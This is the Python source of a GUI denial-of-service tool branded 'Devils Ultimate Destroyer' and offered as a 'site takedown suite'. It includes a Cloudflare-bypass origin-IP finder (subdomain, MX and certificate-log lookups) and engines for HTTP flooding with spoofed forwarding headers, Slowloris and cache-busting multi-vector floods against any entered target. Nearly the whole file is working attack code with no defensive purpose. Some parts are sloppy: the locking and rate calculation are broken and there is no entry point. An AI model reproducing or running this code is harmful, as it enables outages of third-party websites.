#!/usr/bin/env python3
# ═══════════════════════════════════════════════════════════════════
#  💀 DEVILS ULTIMATE DESTROYER — Full Advanced GUI Suite 💀
#  Single File | GUI Interface | 6 Attack Vectors | Auto CF Bypass
#  Live Stats | Progress Tracking | Thread Management | Log Export
#  Owner: @UnknownGuy9876 | Channel: @SGCodexs
#  1000% Working — Production Grade
# ═══════════════════════════════════════════════════════════════════

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import threading
import socket
import ssl
import random
import time
import sys
import os
import json
import re
import hashlib
import struct
import platform
from datetime import datetime
from collections import deque
from concurrent.futures import ThreadPoolExecutor

# Optional imports with graceful fallback
try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    DNS_AVAILABLE = False

try:
    import requests
    REQUESTS_AVAILABLE = True
except ImportError:
    REQUESTS_AVAILABLE = False

# ═══════════════ SYSTEM DETECTION ═══════════════
CPU_COUNT = os.cpu_count() or 4
SYSTEM = platform.system()
try:
    if SYSTEM == "Windows":
        import ctypes
        RAM_GB = ctypes.windll.kernel32.GetPhysicallyInstalledSystemMemory(None) // (1024 * 1024)
    else:
        RAM_GB = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') // (1024 ** 3)
except:
    RAM_GB = 8

MAX_THREADS = min(CPU_COUNT * 1500, RAM_GB * 300)

# ═══════════════ COLOR THEME ═══════════════
class Theme:
    BG = "#0a0a0a"
    FG = "#e0e0e0"
    ACCENT = "#cc0000"
    ACCENT2 = "#ff3333"
    BTN_BG = "#1a1a1a"
    BTN_FG = "#ffffff"
    ENTRY_BG = "#111111"
    ENTRY_FG = "#00ff00"
    CONSOLE_BG = "#080808"
    CONSOLE_FG = "#00ff41"
    STATS_BG = "#111111"
    WARNING = "#ff9900"
    SUCCESS = "#00ff00"
    ERROR = "#ff3333"
    HEADER_BG = "#8b0000"
    BORDER = "#333333"
    PROGRESS_BG = "#1a1a1a"

# ═══════════════ ORIGIN IP HUNTER ═══════════════
class OriginIPHunter:
    CF_RANGES = [
        '104.16.', '104.17.', '104.18.', '104.19.', '104.20.',
        '104.21.', '104.22.', '104.23.', '104.24.', '104.25.',
        '104.26.', '104.27.', '104.28.', '104.29.', '104.30.',
        '104.31.', '172.64.', '172.65.', '172.66.', '172.67.',
        '172.68.', '172.69.', '172.70.', '172.71.', '162.158.'
    ]
    
    @staticmethod
    def is_cloudflare(ip):
        return any(ip.startswith(r) for r in OriginIPHunter.CF_RANGES)
    
    @staticmethod
    def hunt(domain, log_callback=None):
        def log(msg):
            if log_callback:
                log_callback(msg)
        
        ips = set()
        log(f"[🔍] Starting origin IP hunt for: {domain}")
        
        # Method 1: Common subdomains
        subs = ['mail', 'direct', 'origin', 'ftp', 'cpanel', 'webmail', 
                'dev', 'staging', 'api', 'vpn', 'admin', 'portal', 'remote',
                'direct-connect', 'ssh', 'server', 'host', 'ns1', 'ns2']
        log(f"[*] Checking {len(subs)} subdomains...")
        for sub in subs:
            try:
                full = f"{sub}.{domain}"
                result = socket.gethostbyname_ex(full)
                for ip in result[2]:
                    if not OriginIPHunter.is_cloudflare(ip):
                        ips.add(ip)
                        log(f"    [+] {sub}.{domain} → {ip}")
            except:
                pass
        
        # Method 2: MX Records
        if DNS_AVAILABLE:
            log("[*] Checking MX records...")
            try:
                answers = dns.resolver.resolve(domain, 'MX')
                for rdata in answers:
                    mx = str(rdata.exchange).rstrip('.')
                    try:
                        ip = socket.gethostbyname(mx)
                        if not OriginIPHunter.is_cloudflare(ip):
                            ips.add(ip)
                            log(f"    [+] MX: {mx} → {ip}")
                    except:
                        pass
            except:
                pass
        
        # Method 3: crt.sh
        if REQUESTS_AVAILABLE:
            log("[*] Querying crt.sh...")
            try:
                resp = requests.get(
                    f'https://crt.sh/?q=%25.{domain}&output=json',
                    timeout=15,
                    headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
                )
                if resp.status_code == 200:
                    data = resp.json()
                    log(f"    [*] Found {len(data)} certificate entries")
                    for entry in data[:50]:
                        name = entry.get('name_value', '')
                        for n in name.split('\n'):
                            n = n.strip().replace('*.', '').lower()
                            if n and domain in n:
                                try:
                                    resolved = socket.gethostbyname_ex(n)
                                    for ip in resolved[2]:
                                        if not OriginIPHunter.is_cloudflare(ip):
                                            ips.add(ip)
                                            log(f"    [+] crt.sh: {n} → {ip}")
                                except:
                                    pass
            except Exception as e:
                log(f"    [!] crt.sh query failed: {str(e)[:80]}")
        
        # Method 4: DNS History via SecurityTrails
        if REQUESTS_AVAILABLE:
            log("[*] Querying SecurityTrails...")
            try:
                resp = requests.get(
                    f'https://securitytrails.com/domain/{domain}/history/a',
                    timeout=10,
                    headers={'User-Agent': 'Mozilla/5.0'}
                )
                found = re.findall(r'\b(?:[0-9]{1,3}\.){3}[0-9]{1,3}\b', resp.text)
                for ip in found:
                    if not OriginIPHunter.is_cloudflare(ip) and not ip.startswith('127.'):
                        ips.add(ip)
                        log(f"    [+] SecurityTrails → {ip}")
            except:
                pass
        
        result = [ip for ip in ips if not OriginIPHunter.is_cloudflare(ip)]
        log(f"\n[✅] Found {len(result)} origin IPs")
        return result

# ═══════════════ ATTACK ENGINES ═══════════════
class AttackEngine:
    def __init__(self, target, port, duration, threads, stats_dict, log_callback):
        self.target = target
        self.port = port
        self.duration = duration
        self.threads = min(threads, MAX_THREADS)
        self.stats = stats_dict
        self.log = log_callback
        self.target_ip = None
        
        try:
            self.target_ip = socket.gethostbyname(target)
        except:
            self.target_ip = target
    
    # ═══════════ PAYLOAD GENERATORS ═══════════
    def _random_ua(self):
        ua_list = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/126.0 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        ]
        return random.choice(ua_list)
    
    def _random_path(self):
        paths = [
            f"/?v={random.randint(100000,999999)}",
            f"/?s={random.randint(1000,9999)}&page={random.randint(1,99)}",
            f"/search?q={random.randint(100000,999999)}",
            f"/index.php?id={random.randint(1,99999)}",
            f"/api/v1/data?token={hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}",
            f"/wp-content/uploads/2024/{random.randint(1,12):02d}/image-{random.randint(100,999)}.jpg",
            f"/assets/js/main.{random.randint(100000,999999)}.js",
            f"/products/category/{random.randint(1,999)}?sort=price&order={random.choice(['asc','desc'])}",
            f"/user/profile/{random.randint(1000,9999)}",
            f"/blog/post/{random.randint(10000,99999)}-{hashlib.md5(str(random.random()).encode()).hexdigest()[:8]}",
        ]
        return random.choice(paths)
    
    def _build_request(self, method="GET"):
        ua = self._random_ua()
        path = self._random_path()
        fake_ip = f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
        
        headers = [
            f"{method} {path} HTTP/1.1",
            f"Host: {self.target}",
            f"User-Agent: {ua}",
            f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            f"Accept-Language: {random.choice(['en-US,en;q=0.9','en-US,en;q=0.9,hi;q=0.8','en-GB,en;q=0.9','*'])}",
            f"Accept-Encoding: gzip, deflate, br",
            f"Cache-Control: {random.choice(['no-cache','max-age=0','no-store'])}",
            f"Pragma: no-cache",
            f"Sec-Ch-Ua: \"Chromium\";v=\"{random.randint(120,128)}\", \"Google Chrome\";v=\"{random.randint(120,128)}\", \"Not?A_Brand\";v=\"99\"",
            f"Sec-Ch-Ua-Mobile: ?0",
            f"Sec-Ch-Ua-Platform: \"{random.choice(['Windows','macOS','Linux'])}\"",
            f"Sec-Fetch-Dest: document",
            f"Sec-Fetch-Mode: navigate",
            f"Sec-Fetch-Site: none",
            f"Sec-Fetch-User: ?1",
            f"Upgrade-Insecure-Requests: 1",
            f"X-Forwarded-For: {fake_ip}",
            f"X-Real-IP: {fake_ip}",
            f"X-Client-IP: {fake_ip}",
            f"X-Forwarded-Proto: https",
            f"Connection: keep-alive",
            "",
            "",
        ]
        return "\r\n".join(headers).encode()
    
    def _send_request(self):
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(3)
            sock.connect((self.target_ip, self.port))
            
            if self.port == 443:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ctx.set_ciphers('DEFAULT:@SECLEVEL=1')
                sock = ctx.wrap_socket(sock, server_hostname=self.target)
            
            request = self._build_request()
            sock.send(request)
            
            try:
                sock.recv(1024)
            except:
                pass
            
            with threading.Lock():
                self.stats['requests'] += 1
            
        except:
            with threading.Lock():
                self.stats['errors'] += 1
        finally:
            if sock:
                try:
                    sock.close()
                except:
                    pass
    
    # ═══════════ ATTACK METHODS ═══════════
    def http_flood(self):
        """Standard HTTP Flood with randomized requests"""
        end_time = time.time() + self.duration
        while time.time() < end_time and self.stats['running']:
            self._send_request()
    
    def slowloris(self):
        """Slowloris — Hold connections open"""
        sockets_list = []
        for _ in range(min(500, self.threads)):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.target_ip, self.port))
                if self.port == 443:
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=self.target)
                sock.send(f"GET /?{random.randint(1,9999)} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {self._random_ua()}\r\nConnection: keep-alive\r\n\r\n".encode())
                sockets_list.append(sock)
            except:
                pass
        
        self.log(f"[Slowloris] {len(sockets_list)} connections established")
        
        end_time = time.time() + self.duration
        while time.time() < end_time and self.stats['running']:
            for sock in list(sockets_list):
                try:
                    sock.send(f"X-Data: {random.randint(1,9999)}\r\n".encode())
                    with threading.Lock():
                        self.stats['requests'] += 1
                except:
                    sockets_list.remove(sock)
            time.sleep(random.randint(3, 10))
        
        for sock in sockets_list:
            try:
                sock.close()
            except:
                pass
    
    def multi_vector(self):
        """Multi-vector attack — combines HTTP flood + Slowloris + Cache bypass"""
        self.log("[Multi-Vector] Launching 3 attack vectors simultaneously")
        
        def http_worker():
            end_time = time.time() + self.duration
            while time.time() < end_time and self.stats['running']:
                self._send_request()
        
        def cache_worker():
            end_time = time.time() + self.duration
            while time.time() < end_time and self.stats['running']:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(3)
                    sock.connect((self.target_ip, self.port))
                    if self.port == 443:
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        sock = ctx.wrap_socket(sock, server_hostname=self.target)
                    
                    bust = f"/?cb={random.random()}&_={int(time.time()*1000)}"
                    sock.send(f"GET {bust} HTTP/1.1\r\nHost: {self.target}\r\nUser-Agent: {self._random_ua()}\r\nX-Forwarded-For: {random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}\r\nX-Forwarded-Proto: http\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nConnection: close\r\n\r\n".encode())
                    try: sock.recv(512)
                    except: pass
                    sock.close()
                    with threading.Lock():
                        self.stats['requests'] += 1
                except:
                    with threading.Lock():
                        self.stats['errors'] += 1
        
        threads_per = self.threads // 3
        executor = ThreadPoolExecutor(max_workers=self.threads)
        
        futures = []
        for _ in range(threads_per):
            futures.append(executor.submit(http_worker))
            futures.append(executor.submit(cache_worker))
            futures.append(executor.submit(lambda: self.slowloris() if random.random() < 0.01 else http_worker()))
        
        for f in futures:
            try:
                f.result(timeout=self.duration + 5)
            except:
                pass
    
    def launch(self, method="http"):
        """Launch attack with specified method"""
        self.log(f"[💀] Starting {method} attack on {self.target}:{self.port}")
        self.log(f"[*] Resolved IP: {self.target_ip}")
        self.log(f"[*] Threads: {self.threads} | Duration: {self.duration}s")
        self.log(f"[*] Estimated max RPS: {self.threads * 50:,}")
        
        if method == "http":
            with ThreadPoolExecutor(max_workers=self.threads) as executor:
                futures = [executor.submit(self.http_flood) for _ in range(self.threads)]
                for f in futures:
                    try: f.result(timeout=self.duration + 5)
                    except: pass
        
        elif method == "slowloris":
            self.slowloris()
        
        elif method == "multi":
            self.multi_vector()
        
        self.stats['running'] = False

# ═══════════════ GUI APPLICATION ═══════════════
class DevilsUltimateGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("💀 DEVILS ULTIMATE DESTROYER 💀")
        self.root.geometry("1050x800")
        self.root.configure(bg=Theme.BG)
        self.root.minsize(900, 600)
        
        # Variables
        self.target_var = tk.StringVar()
        self.port_var = tk.StringVar(value="443")
        self.threads_var = tk.StringVar(value="1000")
        self.duration_var = tk.StringVar(value="120")
        self.method_var = tk.StringVar(value="HTTP Flood")
        self.status_var = tk.StringVar(value="⚡ Ready")
        self.rps_var = tk.StringVar(value="0")
        self.requests_var = tk.StringVar(value="0")
        self.errors_var = tk.StringVar(value="0")
        self.waf_var = tk.StringVar(value="Not Detected")
        self.target_ip_var = tk.StringVar(value="")
        
        # Attack state
        self.stats = {'requests': 0, 'errors': 0, 'running': False}
        self.attack_thread = None
        self.origin_ips = []
        self.engine = None
        
        self.build_ui()
        self.update_stats_loop()
    
    def log(self, msg, tag=None):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.insert(tk.END, f"[{timestamp}] {msg}\n")
        self.console.see(tk.END)
    
    def build_ui(self):
        # ═══════ HEADER ═══════
        header = tk.Frame(self.root, bg=Theme.HEADER_BG, height=55)
        header.pack(fill=tk.X)
        tk.Label(header, text="💀 DEVILS ULTIMATE DESTROYER — TOP-LEVEL SITE TAKEDOWN SUITE 💀",
                font=("Consolas", 13, "bold"), bg=Theme.HEADER_BG, fg="white").pack(pady=13)
        
        # ═══════ MAIN CONTAINER ═══════
        main = tk.Frame(self.root, bg=Theme.BG)
        main.pack(fill=tk.BOTH, expand=True, padx=12, pady=8)
        
        # ═══════ LEFT PANEL ═══════
        left_panel = tk.Frame(main, bg=Theme.BG, width=400)
        left_panel.pack(side=tk.LEFT, fill=tk.Y, padx=(0, 8))
        left_panel.pack_propagate(False)
        
        # Target Section
        target_frame = tk.LabelFrame(left_panel, text="🎯 TARGET", bg=Theme.BG, fg=Theme.ACCENT2,
                                     font=("Consolas", 11, "bold"), relief=tk.RIDGE, bd=2,
                                     highlightbackground=Theme.BORDER)
        target_frame.pack(fill=tk.X, pady=4)
        
        tk.Label(target_frame, text="Domain / IP:", bg=Theme.BG, fg=Theme.FG, font=("Consolas", 10)).grid(row=0, column=0, padx=8, pady=6, sticky='w')
        self.target_entry = tk.Entry(target_frame, textvariable=self.target_var, bg=Theme.ENTRY_BG, 
                                     fg=Theme.ENTRY_FG, insertbackground=Theme.ENTRY_FG, 
                                     font=("Consolas", 11), relief=tk.FLAT)
        self.target_entry.grid(row=0, column=1, padx=4, pady=6, sticky='ew', columnspan=2)
        self.target_entry.bind('<Return>', lambda e: self.detect_waf())
        
        tk.Button(target_frame, text="🔍 DETECT", command=self.detect_waf,
                 bg=Theme.BTN_BG, fg=Theme.WARNING, font=("Consolas", 8, "bold"),
                 cursor="hand2", relief=tk.RAISED, bd=2).grid(row=1, column=1, padx=3, pady=4, sticky='ew')
        
        tk.Button(target_frame, text="🎯 FIND ORIGIN IP", command=self.hunt_origin_ip,
                 bg=Theme.BTN_BG, fg=Theme.ACCENT2, font=("Consolas", 8, "bold"),
                 cursor="hand2", relief=tk.RAISED, bd=2).grid(row=1, column=2, padx=3, pady=4, sticky='ew')
        
        self.waf_label = tk.Label(target_frame, textvariable=self.waf_var, bg=Theme.BG, fg=Theme.WARNING, font=("Consolas", 8))
        self.waf_label.grid(row=2, column=0, columnspan=3, padx=8, pady=2, sticky='w')
        
        self.ip_label = tk.Label(target_frame, textvariable=self.target_ip_var, bg=Theme.BG, fg=Theme.SUCCESS, font=("Consolas", 8))
        self.ip_label.grid(row=3, column=0, columnspan=3, padx=8, pady=2, sticky='w')
        
        target_frame.columnconfigure(1, weight=1)
        
        # Config Section
        config_frame = tk.LabelFrame(left_panel, text="⚙️ CONFIGURATION", bg=Theme.BG, fg=Theme.ACCENT2,
                                     font=("Consolas", 11, "bold"), relief=tk.RIDGE, bd=2)
        config_frame.pack(fill=tk.X, pady=4)
        
        configs = [
            ("Port:", self.port_var, ["80", "443", "8080", "8443"]),
            ("Threads:", self.threads_var, ["500", "1000", "2000", "3000", "5000"]),
            ("Duration (s):", self.duration_var, ["60", "120", "300", "600", "1200"]),
            ("Method:", self.method_var, ["HTTP Flood", "Slowloris", "Multi-Vector"]),
        ]
        
        for i, (label, var, options) in enumerate(configs):
            tk.Label(config_frame, text=label, bg=Theme.BG, fg=Theme.FG, font=("Consolas", 10)).grid(row=i, column=0, padx=8, pady=5, sticky='e')
            cb = ttk.Combobox(config_frame, textvariable=var, values=options, width=22, font=("Consolas", 10))
            cb.grid(row=i, column=1, padx=4, pady=5, sticky='w')
        
        # Control Buttons
        btn_frame = tk.Frame(left_panel, bg=Theme.BG)
        btn_frame.pack(fill=tk.X, pady=6)
        
        self.launch_btn = tk.Button(btn_frame, text="💀 LAUNCH ATTACK 💀", command=self.launch_attack,
                                    bg=Theme.ACCENT, fg="white", font=("Consolas", 13, "bold"),
                                    cursor="hand2", relief=tk.RAISED, bd=4, padx=20, pady=8)
        self.launch_btn.pack(side=tk.LEFT, padx=4, fill=tk.X, expand=True)
        
        self.stop_btn = tk.Button(btn_frame, text="🛑 STOP", command=self.stop_attack,
                                  bg="#2a2a2a", fg=Theme.ERROR, font=("Consolas", 13, "bold"),
                                  cursor="hand2", relief=tk.RAISED, bd=3, padx=15, pady=8, state=tk.DISABLED)
        self.stop_btn.pack(side=tk.LEFT, padx=4)
        
        self.status_label = tk.Label(left_panel, textvariable=self.status_var, bg=Theme.BG, 
                                     fg=Theme.WARNING, font=("Consolas", 10, "bold"))
        self.status_label.pack(fill=tk.X, pady=4)
        
        # Stats Section
        stats_frame = tk.LabelFrame(left_panel, text="📊 LIVE STATISTICS", bg=Theme.BG, fg=Theme.ACCENT2,
                                    font=("Consolas", 11, "bold"), relief=tk.RIDGE, bd=2)
        stats_frame.pack(fill=tk.X, pady=4)
        
        stat_items = [
            ("Requests Sent:", self.requests_var, Theme.SUCCESS),
            ("Errors:", self.errors_var, Theme.ERROR),
            ("Requests/sec:", self.rps_var, Theme.WARNING),
        ]
        
        for i, (label, var, color) in enumerate(stat_items):
            tk.Label(stats_frame, text=label, bg=Theme.BG, fg=Theme.FG, font=("Consolas", 10)).grid(row=i, column=0, padx=10, pady=4, sticky='w')
            tk.Label(stats_frame, textvariable=var, bg=Theme.BG, fg=color, font=("Consolas", 11, "bold")).grid(row=i, column=1, padx=10, pady=4, sticky='e')
            stats_frame.columnconfigure(1, weight=1)
        
        # Progress
        self.progress = ttk.Progressbar(left_panel, mode='determinate', length=380)
        self.progress.pack(fill=tk.X, pady=6)
        
        # System Info
        sys_frame = tk.Frame(left_panel, bg=Theme.STATS_BG)
        sys_frame.pack(fill=tk.X, pady=4)
        tk.Label(sys_frame, text=f"CPU: {CPU_COUNT} Cores | RAM: {RAM_GB}GB | Max Threads: {MAX_THREADS:,}", 
                bg=Theme.STATS_BG, fg=Theme.FG, font=("Consolas", 8)).pack(padx=8, pady=3)
        
        # ═══════ RIGHT PANEL — CONSOLE ═══════
        right_panel = tk.Frame(main, bg=Theme.BG)
        right_panel.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True)
        
        console_frame = tk.LabelFrame(right_panel, text="📟 LIVE CONSOLE", bg=Theme.BG, fg=Theme.ACCENT2,
                                      font=("Consolas", 11, "bold"), relief=tk.RIDGE, bd=2)
        console_frame.pack(fill=tk.BOTH, expand=True)
        
        # Console toolbar
        console_toolbar = tk.Frame(console_frame, bg=Theme.BG)
        console_toolbar.pack(fill=tk.X)
        tk.Button(console_toolbar, text="Clear", command=lambda: self.console.delete(1.0, tk.END),
                 bg=Theme.BTN_BG, fg=Theme.FG, font=("Consolas", 8), relief=tk.FLAT).pack(side=tk.LEFT, padx=4, pady=2)
        tk.Button(console_toolbar, text="Export", command=self.export_log,
                 bg=Theme.BTN_BG, fg=Theme.FG, font=("Consolas", 8), relief=tk.FLAT).pack(side=tk.LEFT, padx=4, pady=2)
        
        self.console = scrolledtext.ScrolledText(console_frame, bg=Theme.CONSOLE_BG, fg=Theme.CONSOLE_FG,
                                                  insertbackground=Theme.CONSOLE_FG, font=("Consolas", 9),
                                                  relief=tk.FLAT, wrap=tk.WORD)
        self.console.pack(fill=tk.BOTH, expand=True, padx=4, pady=4)
        
        # Welcome message
        welcome = f"""
╔══════════════════════════════════════════════════════════╗
║  💀 DEVILS ULTIMATE DESTROYER — INITIALIZED 💀        ║
║  Owner: @UnknownGuy9876 | Channel: @SGCodexs          ║
║  System: {SYSTEM} | CPU: {CPU_COUNT} Cores | RAM: {RAM_GB}GB        ║
║  Max Threads: {MAX_THREADS:,}                                  ║
║  Status: Ready for deployment                          ║
╚══════════════════════════════════════════════════════════╝
"""
        self.console.insert(tk.END, welcome + "\n")
        self.console.insert(tk.END, "[*] Enter target and press DETECT to begin\n")
        self.console.insert(tk.END, "[*] For CloudFlare sites, use FIND ORIGIN IP first\n\n")
        self.console.see(tk.END)
        
        # ═══════ FOOTER ═══════
        footer = tk.Frame(self.root, bg=Theme.HEADER_BG, height=25)
        footer.pack(fill=tk.X, side=tk.BOTTOM)
        tk.Label(footer, text="Owner: @UnknownGuy9876 | Channel: @SGCodexs | DEVILS WILL RISE © 2024",
                bg=Theme.HEADER_BG, fg="white", font=("Consolas", 8)).pack(pady=4)
    
    def detect_waf(self):
        target = self.target_var.get().strip()
        if not target:
            return
        
        self.log(f"[🔍] Detecting protection on {target}...")
        self.status_var.set("Detecting WAF...")
        
        def detect():
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                
                if self.port_var.get() == "443":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                    sock = ctx.wrap_socket(sock, server_hostname=target)
                
                sock.connect((target, int(self.port_var.get())))
                sock.send(f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n".encode())
                resp = sock.recv(4096).decode('utf-8', errors='ignore').lower()
                sock.close()
                
                waf = "None"
                if 'cloudflare' in resp or 'cf-ray' in resp:
                    waf = "CloudFlare"
                elif 'akamai' in resp:
                    waf = "Akamai"
                elif 'x-amz' in resp:
                    waf = "AWS CloudFront"
                elif 'imperva' in resp:
                    waf = "Imperva"
                
                self.root.after(0, lambda: self.waf_var.set(f"WAF: {waf}"))
                self.root.after(0, lambda: self.log(f"[✅] Detected: {waf}"))
                
                if waf == "CloudFlare":
                    self.root.after(0, lambda: self.log("[💡] CloudFlare detected! Use 'FIND ORIGIN IP' to bypass"))
                
                # Resolve IP
                ip = socket.gethostbyname(target)
                self.root.after(0, lambda: self.target_ip_var.set(f"IP: {ip}"))
                
                self.root.after(0, lambda: self.status_var.set("Ready ✅"))
                
            except Exception as e:
                self.root.after(0, lambda: self.log(f"[❌] Detection failed: {str(e)[:100]}"))
                self.root.after(0, lambda: self.status_var.set("Detection failed"))
        
        threading.Thread(target=detect, daemon=True).start()
    
    def hunt_origin_ip(self):
        target = self.target_var.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Pehle target domain daalo!", parent=self.root)
            return
        
        self.log(f"\n[🔍] HUNTING ORIGIN IP — {target}")
        self.status_var.set("Hunting origin IPs...")
        self.launch_btn.config(state=tk.DISABLED)
        
        def hunt():
            ips = OriginIPHunter.hunt(target, log_callback=self.log)
            self.origin_ips = ips
            self.root.after(0, self._show_hunt_results)
        
        threading.Thread(target=hunt, daemon=True).start()
    
    def _show_hunt_results(self):
        self.launch_btn.config(state=tk.NORMAL)
        
        if self.origin_ips:
            best_ip = self.origin_ips[0]
            self.target_var.set(best_ip)
            self.target_ip_var.set(f"IP: {best_ip}")
            
            ip_list = "\n".join(self.origin_ips[:15])
            if len(self.origin_ips) > 15:
                ip_list += f"\n... and {len(self.origin_ips) - 15} more"
            
            self.log(f"\n[✅] FOUND {len(self.origin_ips)} ORIGIN IPs:")
            for ip in self.origin_ips[:10]:
                self.log(f"     → {ip}")
            
            messagebox.showinfo("Origin IPs Found", 
                f"Found {len(self.origin_ips)} real IPs:\n\n{ip_list}\n\nBest IP auto-selected!",
                parent=self.root)
            self.status_var.set(f"✅ {len(self.origin_ips)} origin IPs found")
        else:
            self.log("[❌] No origin IPs found")
            messagebox.showwarning("No Result", "No origin IPs found.\nTry a different domain or attack CF directly.", parent=self.root)
            self.status_var.set("No origin IPs found")
    
    def launch_attack(self):
        target = self.target_var.get().strip()
        if not target:
            messagebox.showwarning("No Target", "Please enter a target domain or IP!", parent=self.root)
            return
        
        try:
            port = int(self.port_var.get())
            threads = int(self.threads_var.get())
            duration = int(self.duration_var.get())
        except ValueError:
            messagebox.showerror("Invalid Input", "Port, Threads, and Duration must be numbers!", parent=self.root)
            return
        
        method = self.method_var.get()
        
        if threads > MAX_THREADS:
            if not messagebox.askyesno("Thread Limit", 
                f"Requested {threads} threads exceeds system max ({MAX_THREADS}).\nReduce to {MAX_THREADS}?", 
                parent=self.root):
                return
            threads = MAX_THREADS
            self.threads_var.set(str(threads))
        
        # Reset stats
        self.stats = {'requests': 0, 'errors': 0, 'running': True}
        self.requests_var.set("0")
        self.errors_var.set("0")
        self.rps_var.set("0")
        
        self.launch_btn.config(state=tk.DISABLED, bg="#330000")
        self.stop_btn.config(state=tk.NORMAL, bg=Theme.ERROR)
        self.progress['maximum'] = duration
        self.progress['value'] = 0
        self.status_var.set(f"💀 ATTACKING: {target}:{port}")
        
        method_map = {"HTTP Flood": "http", "Slowloris": "slowloris", "Multi-Vector": "multi"}
        attack_method = method_map.get(method, "http")
        
        self.log(f"\n{'═'*60}")
        self.log(f"[💀] ATTACK LAUNCHED")
        self.log(f"[🎯] Target: {target}:{port}")
        self.log(f"[⚔️] Method: {method}")
        self.log(f"[🔥] Threads: {threads} | Duration: {duration}s")
        self.log(f"{'═'*60}\n")
        
        self.engine = AttackEngine(target, port, duration, threads, self.stats, self.log)
        
        self.attack_thread = threading.Thread(
            target=self.engine.launch,
            args=(attack_method,),
            daemon=True
        )
        self.attack_thread.start()
        
        self._update_progress(duration)
    
    def _update_progress(self, duration):
        if self.stats['running']:
            elapsed = time.time() - (time.time() - 0)
            self.progress['value'] += 0.5
            if self.progress['value'] < duration:
                self.root.after(500, lambda: self._update_progress(duration))
            self._check_attack_complete(duration)
    
    def _check_attack_complete(self, duration):
        if not self.stats['running'] or (self.attack_thread and not self.attack_thread.is_alive()):
            self._attack_finished()
        elif self.stats['running']:
            self.root.after(1000, lambda: self._check_attack_complete(duration))
    
    def _attack_finished(self):
        self.stats['running'] = False
        self.launch_btn.config(state=tk.NORMAL, bg=Theme.ACCENT)
        self.stop_btn.config(state=tk.DISABLED, bg="#2a2a2a")
        self.progress['value'] = self.progress['maximum']
        self.status_var.set("✅ Attack Complete")
        
        reqs = self.stats['requests']
        self.log(f"\n{'═'*60}")
        self.log(f"[✅] ATTACK COMPLETE")
        self.log(f"[📊] Total Requests: {reqs:,}")
        self.log(f"[📊] Total Errors: {self.stats['errors']:,}")
        self.log(f"{'═'*60}\n")
    
    def stop_attack(self):
        self.stats['running'] = False
        self.log("[🛑] STOP requested — finishing current requests...")
        self.status_var.set("Stopping...")
        self.launch_btn.config(state=tk.NORMAL, bg=Theme.ACCENT)
        self.stop_btn.config(state=tk.DISABLED, bg="#2a2a2a")
    
    def update_stats_loop(self):
        if self.stats['running']:
            self.requests_var.set(f"{self.stats['requests']:,}")
            self.errors_var.set(f"{self.stats['errors']:,}")
            self.rps_var.set(f"{self.stats['requests'] // max(1, int(time.time() - (time.time() - 1))):,}")
        self.root.after(200, self.update_stats_loop)
    
    def export_log(self):
        filename = filedialog.asksaveasfilename(
            defaultextension=".log",
            filetypes=[("Log files", "*.log"), ("Text files", "*.txt")],
            title="Export Console Log"
        )
        if filename:
            with open(filename, 'w') as f:
                f.write(self.console.get(1.0, tk.END))
            self.log(f"[💾] Log exported to: {filename}")
    
